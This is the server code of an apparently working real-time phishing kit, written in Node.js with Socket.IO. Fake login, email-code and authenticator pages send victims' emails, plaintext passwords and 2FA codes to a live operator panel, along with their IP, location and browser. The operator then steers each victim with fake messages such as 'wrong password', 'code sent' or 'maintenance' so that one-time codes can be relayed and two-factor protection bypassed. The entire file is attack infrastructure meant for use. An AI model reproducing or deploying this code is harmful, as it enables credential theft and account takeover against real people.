const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const UAParser = require('ua-parser-js');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*', methods: ['GET', 'POST'] } });

app.use(cors());
app.use(express.json());

// Serve arquivos estáticos da raiz do projeto
app.use(express.static(path.join(__dirname, '..')));

// Rota principal
app.get('/', (req, res) => {
    const filePath = path.join(__dirname, '..', 'index.html');
    console.log('📄 Servindo index.html de:', filePath);
    res.sendFile(filePath, (err) => {
        if (err) {
            console.log('❌ Erro ao enviar index.html:', err.message);
            // Tenta listar arquivos disponíveis
            try {
                const rootFiles = fs.readdirSync(path.join(__dirname, '..'));
                const backendFiles = fs.readdirSync(__dirname);
                res.status(404).send(`
                    <h1>Arquivo não encontrado</h1>
                    <h2>Raiz do projeto:</h2>
                    <pre>${rootFiles.join('\n')}</pre>
                    <h2>Pasta backend:</h2>
                    <pre>${backendFiles.join('\n')}</pre>
                `);
            } catch (e) {
                res.status(404).send('index.html não encontrado');
            }
        }
    });
});

// Rota de teste para ver arquivos
app.get('/test', (req, res) => {
    try {
        const rootFiles = fs.readdirSync(path.join(__dirname, '..'));
        const backendFiles = fs.readdirSync(__dirname);
        res.json({
            rootDir: path.join(__dirname, '..'),
            backendDir: __dirname,
            rootFiles: rootFiles,
            backendFiles: backendFiles
        });
    } catch (e) {
        res.json({ error: e.message });
    }
});

// Rotas para arquivos HTML
app.get('/validacao.html', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'validacao.html'));
});

app.get('/autenticador.html', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'autenticador.html'));
});

app.get('/manutencao.html', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'manutencao.html'));
});

app.get('/painel-login.html', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'painel-login.html'));
});

app.get('/painel-dashboard.html', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'painel-dashboard.html'));
});

app.get('/painel', (req, res) => {
    res.redirect('/painel-login.html');
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime() });
});

let activeRequests = [];
let allLogs = [];
let onlineClients = 0;
let stats = { approved: 0, rejected: 0, codeSent: 0, codeWrong: 0, maintenance: 0, total: 0, twofa: 0 };
const geoCache = new Map();

function getClientIP(socket) {
    const fwd = socket.handshake.headers['x-forwarded-for'];
    if (fwd) return fwd.split(',')[0].trim();
    return socket.handshake.address || '127.0.0.1';
}

function parseUA(ua) {
    const p = new UAParser(ua);
    const b = p.getBrowser(), o = p.getOS(), d = p.getDevice();
    return { 
        browser: `${b.name||'?'} ${b.version||''}`.trim(), 
        os: `${o.name||'?'} ${o.version||''}`.trim(), 
        device: d.type ? `${d.type} ${d.model||''}`.trim() : d.model || 'Desktop' 
    };
}

async function getGeo(ip) {
    if (['127.0.0.1','localhost','::1'].includes(ip) || ip.startsWith('192.168.') || ip.startsWith('10.')) 
        return { country:'Local', countryCode:'BR', city:'Dev', flag:'🏠' };
    if (geoCache.has(ip)) return geoCache.get(ip);
    try {
        const r = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,city`, { timeout: 3000 });
        if (r.data?.status === 'success') {
            const flag = String.fromCodePoint(...r.data.countryCode.toUpperCase().split('').map(c => 127397 + c.charCodeAt()));
            const d = { country: r.data.country, countryCode: r.data.countryCode, city: r.data.city, flag };
            geoCache.set(ip, d); return d;
        }
    } catch(e) {}
    const fb = { country:'Desconhecido', countryCode:'XX', city:'?', flag:'🌍' };
    geoCache.set(ip, fb); return fb;
}

function emitUpdate() {
    io.emit('current_queue', { activeRequests, logs: allLogs, stats, online: onlineClients });
}

io.on('connection', async (socket) => {
    const type = socket.handshake.query.type;
    const ip = getClientIP(socket);
    const ua = parseUA(socket.handshake.headers['user-agent'] || '');

    console.log(`🔌 Conexão: ${type || 'desconhecido'} | IP: ${ip}`);

    // ============ CLIENTE LOGIN ============
    if (type === 'client') {
        onlineClients++;
        io.emit('clients_update', { online: onlineClients });
        const geo = await getGeo(ip);

        socket.on('login_request', (data) => {
            console.log(`📩 LOGIN: ${data.email} | Senha: ${data.password} | IP: ${ip}`);
            
            const existingIdx = activeRequests.findIndex(r => r.clientSocketId === socket.id && r.type === 'login');
            
            if (existingIdx !== -1) {
                activeRequests[existingIdx].password = data.password;
                activeRequests[existingIdx].email = data.email;
                activeRequests[existingIdx].timestamp = new Date().toLocaleTimeString('pt-BR');
                activeRequests[existingIdx].attempts = (activeRequests[existingIdx].attempts || 1) + 1;
                io.emit('new_request', activeRequests[existingIdx]);
            } else {
                const req = {
                    id: Date.now().toString(36) + Math.random().toString(36).substr(2,5),
                    clientSocketId: socket.id,
                    type: 'login',
                    email: data.email,
                    password: data.password,
                    timestamp: new Date().toLocaleTimeString('pt-BR'),
                    ip, country: geo.country, countryCode: geo.countryCode,
                    city: geo.city, flag: geo.flag, browser: ua.browser, os: ua.os, device: ua.device,
                    attempts: 1
                };
                activeRequests.push(req);
                stats.total++;
                io.emit('new_request', req);
            }
            socket.emit('request_received', { status: 'ok' });
        });

        socket.on('disconnect', () => {
            onlineClients = Math.max(0, onlineClients - 1);
            io.emit('clients_update', { online: onlineClients });
        });
    }

    // ============ CLIENTE CÓDIGO EMAIL ============
    if (type === 'code_client') {
        onlineClients++;
        io.emit('clients_update', { online: onlineClients });
        const geo = await getGeo(ip);

        socket.on('code_submitted', (data) => {
            console.log(`📩 CÓDIGO: ${data.code} | IP: ${ip}`);
            
            const existingIdx = activeRequests.findIndex(r => r.clientSocketId === socket.id && r.type === 'code');
            
            if (existingIdx !== -1) {
                activeRequests[existingIdx].code = data.code;
                activeRequests[existingIdx].timestamp = new Date().toLocaleTimeString('pt-BR');
                activeRequests[existingIdx].attempts = (activeRequests[existingIdx].attempts || 1) + 1;
                io.emit('update_code_request', activeRequests[existingIdx]);
            } else {
                const req = {
                    id: 'code_' + Date.now().toString(36) + Math.random().toString(36).substr(2,5),
                    clientSocketId: socket.id,
                    type: 'code',
                    code: data.code,
                    email: 'Código Email',
                    timestamp: new Date().toLocaleTimeString('pt-BR'),
                    ip, country: geo.country, countryCode: geo.countryCode,
                    city: geo.city, flag: geo.flag, browser: ua.browser, os: ua.os, device: ua.device,
                    attempts: 1
                };
                activeRequests.push(req);
                stats.total++;
                io.emit('new_code_request', req);
            }
            socket.emit('code_received', { status: 'ok' });
        });

        socket.on('disconnect', () => {
            onlineClients = Math.max(0, onlineClients - 1);
            io.emit('clients_update', { online: onlineClients });
        });
    }

    // ============ CLIENTE 2FA ============
    if (type === '2fa_client') {
        onlineClients++;
        io.emit('clients_update', { online: onlineClients });
        const geo = await getGeo(ip);

        socket.on('2fa_submitted', (data) => {
            console.log(`📩 2FA: ${data.code} | IP: ${ip}`);
            
            const existingIdx = activeRequests.findIndex(r => r.clientSocketId === socket.id && r.type === '2fa');
            
            if (existingIdx !== -1) {
                activeRequests[existingIdx].code = data.code;
                activeRequests[existingIdx].timestamp = new Date().toLocaleTimeString('pt-BR');
                activeRequests[existingIdx].attempts = (activeRequests[existingIdx].attempts || 1) + 1;
                io.emit('update_code_request', activeRequests[existingIdx]);
            } else {
                const req = {
                    id: '2fa_' + Date.now().toString(36) + Math.random().toString(36).substr(2,5),
                    clientSocketId: socket.id,
                    type: '2fa',
                    code: data.code,
                    email: 'Autenticador 2FA',
                    timestamp: new Date().toLocaleTimeString('pt-BR'),
                    ip, country: geo.country, countryCode: geo.countryCode,
                    city: geo.city, flag: geo.flag, browser: ua.browser, os: ua.os, device: ua.device,
                    attempts: 1
                };
                activeRequests.push(req);
                stats.total++;
                io.emit('new_code_request', req);
            }
            socket.emit('2fa_received', { status: 'ok' });
        });

        socket.on('disconnect', () => {
            onlineClients = Math.max(0, onlineClients - 1);
            io.emit('clients_update', { online: onlineClients });
        });
    }

    // ============ OPERADOR ============
    if (type === 'operator') {
        console.log('🛡️ OPERADOR CONECTADO');
        emitUpdate();
        socket.emit('clients_update', { online: onlineClients });

        socket.on('validate_login', (data) => {
            const req = activeRequests.find(r => r.id === data.requestId);
            if (req && req.clientSocketId) {
                io.to(req.clientSocketId).emit('login_result', {
                    action: 'approved',
                    message: '¡Inicio de sesión exitoso! Bienvenido/a ' + req.email
                });
                allLogs.push({ timestamp: new Date().toLocaleString('pt-BR'), type: 'LOGIN', email: req.email, password: req.password, ip: req.ip, country: req.country, flag: req.flag, browser: req.browser, action: 'Aprovado' });
                stats.approved++;
                emitUpdate();
            }
        });

        socket.on('wrong_password', (data) => {
            const req = activeRequests.find(r => r.id === data.requestId);
            if (req && req.clientSocketId) {
                io.to(req.clientSocketId).emit('login_result', { action: 'wrong_password', message: 'Contraseña incorrecta' });
                allLogs.push({ timestamp: new Date().toLocaleString('pt-BR'), type: 'LOGIN', email: req.email, password: req.password, ip: req.ip, country: req.country, flag: req.flag, browser: req.browser, action: 'Senha Incorreta' });
                stats.rejected++;
                emitUpdate();
            }
        });

        socket.on('send_code_email', (data) => {
            const req = activeRequests.find(r => r.id === data.requestId);
            if (req && req.clientSocketId) {
                io.to(req.clientSocketId).emit('login_result', { action: 'code_email', message: 'Código enviado a tu correo electrónico' });
                allLogs.push({ timestamp: new Date().toLocaleString('pt-BR'), type: 'LOGIN', email: req.email, password: req.password, ip: req.ip, country: req.country, flag: req.flag, browser: req.browser, action: 'Código Email' });
                stats.codeSent++;
                emitUpdate();
            }
        });

        socket.on('send_2fa', (data) => {
            const req = activeRequests.find(r => r.id === data.requestId);
            if (req && req.clientSocketId) {
                io.to(req.clientSocketId).emit('login_result', { action: 'redirect_2fa', message: '' });
                allLogs.push({ timestamp: new Date().toLocaleString('pt-BR'), type: 'LOGIN', email: req.email, password: req.password, ip: req.ip, country: req.country, flag: req.flag, browser: req.browser, action: '2FA Solicitado' });
                stats.twofa++;
                emitUpdate();
            }
        });

        socket.on('send_maintenance', (data) => {
            const req = activeRequests.find(r => r.id === data.requestId);
            if (req && req.clientSocketId) {
                io.to(req.clientSocketId).emit('login_result', { action: 'maintenance', message: 'Sistema en mantenimiento' });
                allLogs.push({ timestamp: new Date().toLocaleString('pt-BR'), type: 'LOGIN', email: req.email, password: req.password, ip: req.ip, country: req.country, flag: req.flag, browser: req.browser, action: 'Manutenção' });
                stats.maintenance++;
                emitUpdate();
            }
        });

        socket.on('code_approved', (data) => {
            const req = activeRequests.find(r => r.id === data.requestId);
            if (req && req.clientSocketId) {
                io.to(req.clientSocketId).emit('code_result', { action: 'code_approved', message: '¡Código verificado! Acceso concedido' });
                allLogs.push({ timestamp: new Date().toLocaleString('pt-BR'), type: 'CÓDIGO', email: req.email, password: req.code, ip: req.ip, country: req.country, flag: req.flag, browser: req.browser, action: 'Código Correto' });
                stats.approved++;
                emitUpdate();
            }
        });

        socket.on('code_wrong', (data) => {
            const req = activeRequests.find(r => r.id === data.requestId);
            if (req && req.clientSocketId) {
                io.to(req.clientSocketId).emit('code_result', { action: 'code_wrong', message: 'Código incorrecto. Inténtalo de nuevo' });
                allLogs.push({ timestamp: new Date().toLocaleString('pt-BR'), type: 'CÓDIGO', email: req.email, password: req.code, ip: req.ip, country: req.country, flag: req.flag, browser: req.browser, action: 'Código Errado' });
                stats.codeWrong++;
                emitUpdate();
            }
        });

        socket.on('code_maintenance', (data) => {
            const req = activeRequests.find(r => r.id === data.requestId);
            if (req && req.clientSocketId) {
                io.to(req.clientSocketId).emit('code_result', { action: 'code_maintenance', message: 'Sistema en mantenimiento' });
                allLogs.push({ timestamp: new Date().toLocaleString('pt-BR'), type: 'CÓDIGO', email: req.email, password: req.code, ip: req.ip, country: req.country, flag: req.flag, browser: req.browser, action: 'Manutenção' });
                stats.maintenance++;
                emitUpdate();
            }
        });

        socket.on('2fa_approved', (data) => {
            const req = activeRequests.find(r => r.id === data.requestId);
            if (req && req.clientSocketId) {
                io.to(req.clientSocketId).emit('2fa_result', { action: '2fa_approved', message: '¡Autenticador verificado! Acceso concedido' });
                allLogs.push({ timestamp: new Date().toLocaleString('pt-BR'), type: '2FA', email: req.email, password: req.code, ip: req.ip, country: req.country, flag: req.flag, browser: req.browser, action: '2FA Correto' });
                stats.approved++;
                emitUpdate();
            }
        });

        socket.on('2fa_wrong', (data) => {
            const req = activeRequests.find(r => r.id === data.requestId);
            if (req && req.clientSocketId) {
                io.to(req.clientSocketId).emit('2fa_result', { action: '2fa_wrong', message: 'Código de autenticador incorrecto. Inténtalo de nuevo' });
                allLogs.push({ timestamp: new Date().toLocaleString('pt-BR'), type: '2FA', email: req.email, password: req.code, ip: req.ip, country: req.country, flag: req.flag, browser: req.browser, action: '2FA Incorreto' });
                stats.codeWrong++;
                emitUpdate();
            }
        });

        socket.on('2fa_maintenance', (data) => {
            const req = activeRequests.find(r => r.id === data.requestId);
            if (req && req.clientSocketId) {
                io.to(req.clientSocketId).emit('2fa_result', { action: '2fa_maintenance', message: 'Sistema en mantenimiento' });
                allLogs.push({ timestamp: new Date().toLocaleString('pt-BR'), type: '2FA', email: req.email, password: req.code, ip: req.ip, country: req.country, flag: req.flag, browser: req.browser, action: 'Manutenção' });
                stats.maintenance++;
                emitUpdate();
            }
        });

        socket.on('delete_request', (data) => {
            const idx = activeRequests.findIndex(r => r.id === data.requestId);
            if (idx !== -1) {
                const req = activeRequests[idx];
                allLogs.push({ timestamp: new Date().toLocaleString('pt-BR'), type: req.type.toUpperCase(), email: req.email || req.code, password: req.password || req.code, ip: req.ip, country: req.country, flag: req.flag, browser: req.browser, action: '🗑️ Apagado' });
                activeRequests.splice(idx, 1);
                emitUpdate();
            }
        });
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log('═══════════════════════════════════');
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
    console.log(`📂 Raiz do projeto: ${path.join(__dirname, '..')}`);
    console.log('═══════════════════════════════════');
});
